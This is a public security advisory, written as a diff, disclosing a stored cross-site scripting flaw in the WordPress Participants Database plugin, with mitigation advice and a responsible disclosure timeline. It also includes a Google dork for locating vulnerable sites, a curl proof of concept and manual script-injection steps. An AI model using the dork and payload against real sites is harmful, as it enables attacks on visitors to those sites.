@@ -1,0 +1,72 @@
+# Exploit Title: Wordpress Plugin Participants Database < 1.7.5.10 - XSS
+# Google Dork: inurl:wp-content/plugins/participants-database/
+# Date: 01-Sep-17
+# Exploit Author: Benjamin Lim
+# Vendor Homepage: https://xnau.com/
+# Software Link: https://wordpress.org/plugins/participants-database/
+# Version: 1.7.5.9
+# Tested on: Kali Linux 2.0
+# CVE : CVE-2017-14126
+
+
+1. Product & Service Introduction:
+==================================
+Participants Database is a Wordpress plugin for managing a database of
+participants, members or volunteers. As of now, the plugin has been
+downloaded 320,000 times and has 10,000+ active installs.
+
+
+2. Technical Details & Description:
+===================================
+Cross site scripting (XSS) vulnerability in the Wordpress Participants
+Database plugin 1.7.59 allows attackers to inject arbitrary javascript via
+the Name parameter.
+The XSS vulnerability is found on the participant signup form input
+textfield. The get_field_value_display() function in
+PDb_FormElement.class.php did not escape HTML special characters, allowing
+an attacker to input javascript. The XSS code will be executed on 2 pages.
+
+1) The "Thank you for signing up" page immediately after submitting the
+form.
+2) The page which is configured to output the list of participants with the
+[pdb_list] shortcode.
+
+
+3. Proof of Concept (PoC):
+==========================
+
+curl -k -F action=signup -F subsource=participants-database -F
+shortcode_page=/?page_id=1 -F thanks_page=/?page_id=1 -F instance_index=2
+-F pdb_data_keys=1.2.9.10 -F session_hash=0123456789 -F
+first_name=<script>alert("1");</script> -F last_name=a -F email=a@a.com -F
+mailing_list=No -F submit_button=Submit http://localhost/?page_id=1
+
+To trigger manually, browse to the page, input the following in the form
+and click Sign Up.
+
+First Name: <script>alert("1");</script>
+Last Name: test
+Email: test@test.com
+
+
+4. Mitigation
+=============
+Update to version 1.7.5.10
+
+
+5. Disclosure Timeline
+======================
+2017/09/01 Vendor contacted
+2017/09/02 Vendor responded
+2017/09/03 Update released
+2017/09/06 Advisory released to the public
+
+
+6. Credits & Authors:
+=====================
+Benjamin Lim - [https://limbenjamin.com]
+
+--
+*Benjamin Lim*
+E: mail@limbenjamin.com
+PGP : https://limbenjamin.com/pgp
